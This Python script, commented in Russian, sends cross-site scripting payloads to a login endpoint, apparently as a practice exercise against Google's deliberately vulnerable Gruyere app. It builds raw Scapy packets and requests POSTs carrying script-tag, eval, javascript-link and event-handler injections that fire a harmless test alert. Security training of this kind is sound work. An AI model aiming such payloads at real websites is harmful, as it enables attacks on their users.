from scapy.all import Raw, send
from scapy.layers.inet import TCP, IP
from scapy.sendrecv import sr1
from scapy.volatile import RandShort
import requests
from env import *


def send_xss_via_scapy() -> str:
    """
    отправка запроса с XSS инъекцией через Scapy
    :return: ответ от запроса
    """
    xss_injection = "<script>alert('XSS_TEST')</script>"
    content = f'uid={xss_injection}&pw=P@ssw0rd'
    http_payload = (
        f"GET /{TARGET_UID}/login&{content} HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        # "User-Agent: Scapy-XSS-Test\r\n"
        # "Content-Type: application/x-www-form-urlencoded\r\n"
        # f"Content-Length: {len(content)}\r\n"
        # "Connection: close\r\n\r\n"
        # f"{content}"
    )

    ip_layer = IP(dst=TARGET_IP)  # создание IP-пакета
    tcp_layer = TCP(dport=TARGET_PORT, sport=RandShort(), flags="PA")  # создание TCP-сегмента с флагом "PA" (Push + Ack)
    raw_layer = Raw(load=http_payload)  # создание полезной нагрузки
    packet = ip_layer / tcp_layer / raw_layer  # формируем полный пакет

    response = sr1(packet, timeout=5)
    return response.show() if response else "No response received"

def send_xss_via_requests() -> str:
    """
    отправка запроса с XSS инъекцией через Requests
    :return: ответ от запроса
    """
    url = f"http://google-gruyere.appspot.com/{TARGET_UID}/login"
    data_payload = {
        "uid": '<script>eval("alert(\'XSS_TEST\')")</script>',
        "pw": "P@ssw0rd"
    }
    # data_payload = {
    #     "comment": '<a href="javascript:alert(\'XSS_TEST\')">Click me!</a>'
    # }
    # data_payload = {
    #     "comment": '<div onmouseover="alert(\'XSS_TEST\')">Hover over me!</div>'
    # }

    response = requests.post(url, data=data_payload)
    print("Статус-код:", response.status_code)
    print("Ответ сервера:", response.url)
    return response.text if response else "No response received"

def send_tcp(via_scapy: bool = True) -> None:
    """
    захват всего трафика на порту
    :param via_scapy: использовать библиотеку Scapy, иначе Requests
    """
    print("Отправка HTTP-запроса:")
    print(send_xss_via_scapy() if via_scapy else send_xss_via_requests())


if __name__ == '__main__':
    send_tcp()
